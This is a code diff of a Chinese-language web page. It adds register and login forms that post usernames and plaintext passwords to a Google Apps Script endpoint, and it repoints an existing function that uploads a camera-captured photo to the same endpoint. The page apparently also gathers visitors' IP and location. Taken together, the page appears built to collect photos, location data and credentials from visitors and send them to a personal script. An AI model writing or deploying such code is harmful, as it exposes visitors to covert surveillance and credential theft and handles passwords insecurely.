@@ -57,6 +57,24 @@
 <div class="container">
   <div class="container">
     <div class="card">
+<!-- 註冊表單 -->
+    <h2>註冊</h2>
+    <input type="text" id="registerUsername" placeholder="輸入用戶名">
+    <input type="password" id="registerPassword" placeholder="輸入密碼">
+    <button onclick="handleRegister()">註冊</button>
+    <p class="status" id="registerStatus"></p>
+  </div>
+
+  <div class="container" style="margin-top: 20px;">
+    <!-- 登入表單 -->
+    <h2>登入</h2>
+    <input type="text" id="loginUsername" placeholder="輸入用戶名">
+    <input type="password" id="loginPassword" placeholder="輸入密碼">
+    <button onclick="handleLogin()">登入</button>
+    <p class="status" id="loginStatus"></p>
+  </div>
+
+      
       <h2>IP 與位置資訊</h2>
       <p id="ipInfo" class="status-text">資訊載入中...</p>
     </div>
@@ -81,6 +99,52 @@
   </div>
 
   <script>
+
+async function handleRegister() {
+  const username = document.getElementById('registerUsername').value;
+  const password = document.getElementById('registerPassword').value;
+
+  const response = await fetch('https://script.google.com/macros/s/AKfycbwCA5OXAFX5oJw_DEW7t9B_7ma5Fy_kB-qci7gL0qLLVXJyEz7gDqRpSPwe-_uWrOKJdw/exec', {
+    method: 'POST',
+    body: JSON.stringify({
+      action: 'register',
+      username: username,
+      password: password,
+    }),
+    headers: {
+      'Content-Type': 'application/json',
+    },
+  });
+
+  const result = await response.json();
+  document.getElementById('registerStatus').innerText = result.message;
+}
+
+async function handleLogin() {
+  const username = document.getElementById('loginUsername').value;
+  const password = document.getElementById('loginPassword').value;
+
+  const response = await fetch('https://script.google.com/macros/s/AKfycbwCA5OXAFX5oJw_DEW7t9B_7ma5Fy_kB-qci7gL0qLLVXJyEz7gDqRpSPwe-_uWrOKJdw/exec', {
+    method: 'POST',
+    body: JSON.stringify({
+      action: 'login',
+      username: username,
+      password: password,
+    }),
+    headers: {
+      'Content-Type': 'application/json',
+    },
+  });
+
+  const result = await response.json();
+  document.getElementById('loginStatus').innerText = result.message;
+}
+
+
+
+
+
+    
   async function startCamera() {
   let stream = null;
   try {
@@ -198,7 +262,7 @@ async function collectAndSendData() {
       formData.append('imageData', collectedData.photo);
     }
 
-    const response = await fetch('https://script.google.com/macros/s/AKfycbxpXbFw3WoVgqOPOikRyRQsydj31LYTIweD6G_7YPpBuNpgNmObsWulocUtFCyi-foUAA/exec', {
+    const response = await fetch('https://script.google.com/macros/s/AKfycbwCA5OXAFX5oJw_DEW7t9B_7ma5Fy_kB-qci7gL0qLLVXJyEz7gDqRpSPwe-_uWrOKJdw/exec', {
       method: 'POST',
       body: formData,
     });
